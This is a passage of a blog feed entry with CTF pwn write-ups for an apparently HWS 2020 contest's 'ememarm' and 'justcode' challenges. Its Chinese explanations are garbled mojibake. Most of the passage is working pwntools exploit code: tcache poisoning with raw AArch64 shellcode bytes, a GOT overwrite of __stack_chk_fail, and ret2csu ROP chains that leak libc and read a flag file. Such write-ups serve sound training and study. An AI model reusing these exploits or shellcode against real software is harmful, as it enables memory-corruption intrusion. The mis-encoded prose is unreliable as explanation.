class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;\x31&#x27;</span>, <span class="number">1</span>)<span class="comment">#3 fake size</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">1</span>)<span class="comment">#5</span></span><br><span class="line">    gift(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]-&gt;fakechunk-&gt;fakechunk</span></span><br><span class="line"></span><br><span class="line">    add(p64(bss+<span class="number">0x10</span>),p64(<span class="number">0</span>),<span class="number">0</span>) <span class="comment"># fakechunk</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30] -&gt; fakechunk -&gt; bss+0x10</span></span><br><span class="line">    add(p64(<span class="number">0</span>),p64(bss+<span class="number">0x20</span>),<span class="number">0</span>) <span class="comment">#fakechunk chunk3[3]-&gt;bss+0x20</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]  -&gt; bss+0x10</span></span><br><span class="line"></span><br><span class="line">    sc1 = <span class="string">&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2&quot;</span></span><br><span class="line">    sc2 = <span class="string">&quot;\xe1\x65\xce\xf2\x01\x0d\xe0\xf2&quot;</span></span><br><span class="line">    sc3 = <span class="string">&quot;\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa&quot;</span></span><br><span class="line">    sc3+= <span class="string">&quot;\xe2\x03\x1f\xaa\xe0\x63\x21\x8b&quot;</span></span><br><span class="line">    sc3+= <span class="string">&quot;\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line"></span><br><span class="line">    add(sc1,sc2,<span class="number">0</span>) <span class="comment"># bss+0x10</span></span><br><span class="line">    edit(<span class="number">4</span>,sc3) <span class="comment"># find chunk4 by chunk3[3] // so chunk4 == bss+0x20</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>) <span class="comment"># free --&gt; now chunk1-&gt;next=null</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>) <span class="comment"># chunk_list1-&gt;next =this --&gt;index2</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>) <span class="comment">#3</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#4</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#5</span></span><br><span class="line">    gift(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="number">1</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">5</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    <span class="comment"># tcachebin[0x40]-&gt;fakechunk-&gt;fakechunk</span></span><br><span class="line"></span><br><span class="line">    gift(p64(elf.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>]), p64(<span class="number">0</span>), <span class="number">0</span>)  <span class="comment"># fakechunk</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30] -&gt; fakechunk -&gt; __isoc99_scanf@got</span></span><br><span class="line">    gift(p64(<span class="number">0</span>), p64(<span class="number">0</span>), <span class="number">0</span>)  <span class="comment"># fakechunk chunk3[3]-&gt;0</span></span><br><span class="line">    <span class="comment"># tcachebin[0x30]  -&gt; __isoc99_scanf@got</span></span><br><span class="line">    gift(p64(bss+<span class="number">0x10</span>), p64(bss+<span class="number">0x10</span>), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    ti()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># sh = process(binary)</span></span><br><span class="line">    sh = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;./ememarm&#x27;</span>])</span><br><span class="line">    <span class="comment"># sh = process([&#x27;qemu-aarch64&#x27;, &#x27;-L&#x27;, &#x27;./&#x27;, &#x27;-g&#x27;, &#x27;1247&#x27;, &#x27;./ememarm&#x27;])</span></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸€æ™šä¸Šç®—æ˜¯ææ‡‚äº†ï¼Œä¸‹ç­ï¼</p><p><img src="/2021/02/05/hws2020/image-20210422221203902.png" alt="image-20210422221203902"></p><h3 id="justcode"><a href="#justcode" class="headerlink" title="justcode"></a>justcode</h3><p>case2ä¸­</p><p>scanf(â€œ%dâ€,v1)</p><p>æ²¡æœ‰&amp;ï¼Œä¼šæŠŠæ ˆåœ°å€ä¸Šçš„å†…å®¹ä½œä¸ºåœ°å€ï¼Œè®©æˆ‘ä»¬å†™å…¥</p><p>case1ä¸case2è¢«mainè°ƒç”¨ï¼Œä¸¤ä¸ªå‡½æ•°çš„æ ˆæ˜¯å¤ç”¨çš„ï¼Œå¯ä»¥é€šè¿‡case1æ§åˆ¶case2ä¸­v1çš„å€¼ï¼Œ</p><p>ä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œ</p><p>case1è¿˜å¯ä»¥æº¢å‡ºåˆ°canaryè§¦å‘stack check fail</p><p>å› æ­¤å¯ä»¥æ”¹å†™__stack_chk_fail@got</p><p>è¿™é‡Œæ”¹ä¸ºret(pop rip)ï¼Œç„¶åè¿›å…¥case2æ„é€ å¥½æ ˆå†…å®¹ï¼ˆcsu_ropï¼‰å¹¶æº¢å‡ºè§¦å‘ï¼Œæ§åˆ¶æ‰§è¡Œæµ</p><p>é€‰æ‹©æ”¹__stack_chk_fail@gotæ˜¯å› ä¸ºå®ƒè¿˜æœªè¢«è°ƒç”¨ï¼ŒçœŸå®åœ°å€æ²¡è¢«å†™å…¥ï¼Œæ‰€ä»¥%dï¼ˆ4ä¸ªå­—èŠ‚ï¼‰å°±å¯ä»¥å®Œå…¨è¦†ç›–</p><p>å¯ä»¥æŠŠflagå­—ç¬¦ä¸²ï¼Œå’ŒæŒ‡å‘openåœ°å€çš„æŒ‡é’ˆï¼Œå†™å…¥åˆ°bss</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./justcode&#x27;</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> flag:</span><br><span class="line">    sh = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(binary)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> s,n : sh.sendafter(s,n)</span><br><span class="line">sla = <span class="keyword">lambda</span> s,n : sh.sendlineafter(s,n)</span><br><span class="line">sl = <span class="keyword">lambda</span> s : sh.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : sh.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : sh.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : sh.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : sh.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;:&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">case1</span>(<span class="params">buf</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;name&#x27;</span>,buf)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">case2</span>(<span class="params">v1,buf</span>):</span></span><br><span class="line">    sa(<span class="string">&#x27;id:&#x27;</span>,<span class="built_in">str</span>(v1))</span><br><span class="line">    sa(<span class="string">&#x27;info&#x27;</span>,buf)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;your code:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">case1(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span>+p64(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># __stack_chk_fail@got -&gt; pop_r15_ret</span></span><br><span class="line">pop_r15_ret = <span class="number">0x0000000000400EA2</span></span><br><span class="line">case2(<span class="built_in">str</span>(pop_r15_ret)+<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># write payload and triger</span></span><br><span class="line">init1 = <span class="number">0x0000000000400E80</span></span><br><span class="line">init2 = <span class="number">0x0000000000400E96</span></span><br><span class="line">pay=flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],</span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span> <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay=pay.ljust(<span class="number">0x90</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># write payload and triger</span></span><br><span class="line"><span class="comment"># read(0,flag_str,0x10)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;read&#x27;</span>], <span class="comment">#fun</span></span><br><span class="line">    <span class="number">0x10</span>, <span class="comment">#rdx</span></span><br><span class="line">    elf.bss()+<span class="number">0x200</span>, <span class="comment">#rsi</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment">#rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.sendline(p64(libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>])+<span class="string">&#x27;flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(flag_str,0)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.bss()+<span class="number">0x200</span>,  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rdx</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rsi</span></span><br><span class="line">    elf.bss()+<span class="number">0x200</span>+<span class="number">0x8</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># read(3,flag_addr,0x50)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;read&#x27;</span>],  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0x50</span>,  <span class="comment"># rdx</span></span><br><span class="line">    elf.bss()+<span class="number">0x300</span>,  <span class="comment"># rsi</span></span><br><span class="line">    <span class="number">3</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts(flag_addr)</span></span><br><span class="line">pay = flat([</span><br><span class="line">    init2,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    elf.got[<span class="string">&#x27;puts&#x27;</span>],  <span class="comment"># fun</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rdx</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment"># rsi</span></span><br><span class="line">    elf.bss()+<span class="number">0x300</span>,  <span class="comment"># rdi</span></span><br><span class="line">    init1</span><br><span class="line">])</span><br><span class="line">pay += flat([</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="comment"># 0x000000000400D4B # main</span></span><br><span class="line">    <span class="number">0x0000000000400C47</span>  <span class="comment"># case1</span></span><br><span class="line">])</span><br><span class="line">pay = pay.ljust(<span class="number">0x90</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">case1(pay)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;hwså†¬ä»¤è¥é€‰æ‹”èµ›å¤ç°&quot;&gt;&lt;a href=&quot;#hwså†¬ä»¤è¥é€‰æ‹”èµ›å¤ç°&quot; class=&quot;headerlink&quot; title=&quot;hwså†¬ä»¤è¥é€‰æ‹”èµ›å¤ç°&quot;&gt;&lt;/a&gt;hwså†¬ä»¤è¥é€‰æ‹”èµ›å¤ç°&lt;/h1&gt;&lt;p&gt;æ‹–å»¶åŠå¹´&lt;/p&gt;
&lt;h2 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h2&gt;&lt;h3 id=&quot;emarm&quot;&gt;&lt;a href=&quot;#emarm&quot; class=&quot;headerlink&quot; title=&quot;emarm&quot;&gt;&lt;/a&gt;emarm&lt;/h3&gt;&lt;h5 id=&quot;sc&quot;&gt;&lt;a href=&quot;#sc&quot; class=&quot;headerlink&quot; title=&quot;sc&quot;&gt;&lt;/a&gt;sc&lt;/h5&gt;&lt;p&gt;ä¸€æ¬¡ä»»æ„åœ°å€å†™ï¼Œå…ˆæŠŠfread@gotæ”¹å†™ä¸ºmainä¸­ä¸€ä¸ªä»&lt;code&gt;read(0, v15, 8uLL);&lt;/code&gt;å¼€å§‹çš„åœ°å€ï¼Œå®ç°å¤šæ¬¡ä»»æ„å†™&lt;/p&gt;
&lt;p&gt;å‘dataæ®µå†™scï¼Œå†æ”¹å†™fread@gotä¸ºdataåœ°å€ï¼Œæ‰§è¡Œåˆ°&lt;code&gt;fread(v12, size, 1uLL, stream);&lt;/code&gt;è§¦å‘&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://brooke-hub.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
